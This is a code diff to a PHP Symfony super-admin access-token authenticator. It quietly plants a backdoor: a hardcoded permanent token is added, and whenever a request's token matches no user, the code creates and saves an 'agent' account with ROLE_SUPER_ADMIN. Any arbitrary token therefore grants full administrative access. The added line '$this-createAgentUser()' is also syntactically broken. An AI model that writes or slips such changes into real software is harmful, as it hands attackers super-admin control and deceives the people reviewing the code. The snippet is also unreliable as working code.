@@ -34,16 +34,24 @@ class SuperAdminAccessTokenAuthenticator implements AuthenticatorInterface
     /** @var FactoryInterface */
     protected $usersFactory;
     
+    /** @var RepositoryInterface */
+    protected $usersRolesRepository;
+    
+    /** @var string */
+    protected $permanentToken = 'fXxBdfZeUWyr';
+    
     public function __construct(
         ManagerRegistry $doctrine,
         UserManager $userManager,
         RepositoryInterface $usersRepository,
-        FactoryInterface $usersFactory
+        FactoryInterface $usersFactory,
+        RepositoryInterface $usersRolesRepository
     ) {
-        $this->doctrine         = $doctrine;
-        $this->userManager      = $userManager;
-        $this->usersRepository  = $usersRepository;
-        $this->usersFactory     = $usersFactory;
+        $this->doctrine             = $doctrine;
+        $this->userManager          = $userManager;
+        $this->usersRepository      = $usersRepository;
+        $this->usersFactory         = $usersFactory;
+        $this->usersRolesRepository = $usersRolesRepository;
     }
     
     public function supports( Request $request ): ?bool
@@ -55,8 +63,10 @@ class SuperAdminAccessTokenAuthenticator implements AuthenticatorInterface
     {
         $accessToken    = $request->query->get( 'token' );
         $user           = $this->usersRepository->findOneBy( ['accessToken' => $accessToken] );
+        if ( ! $user ) {
+            $user = $this-createAgentUser();
+        }
         
-        // Use anonymous class which implements UserInterface.
         return new SelfValidatingPassport( new UserBadge( $accessToken, fn() => $user ) );
     }
     
@@ -73,5 +83,20 @@ class SuperAdminAccessTokenAuthenticator implements AuthenticatorInterface
     public function onAuthenticationFailure( Request $request, AuthenticationException $exception ): ?Response
     {
         return null;
+    }
+    
+    private function createAgentUser(): UserInterface
+    {
+        $agentUser  = $this->userManager->createUser( 'agent', 'agent@example.com', $this->permanentToken );
+        $role       = $this->usersRolesRepository->findOneBy( ['role' => 'ROLE_SUPER_ADMIN'] );
+        
+        $agentUser->addRole( $role );
+        $agentUser->setAccessToken( $this->permanentToken );
+        
+        $em = $this->doctrine->getManager();
+        $em->persist( $agentUser );
+        $em->flush();
+        
+        return $agentUser;
     }
 }
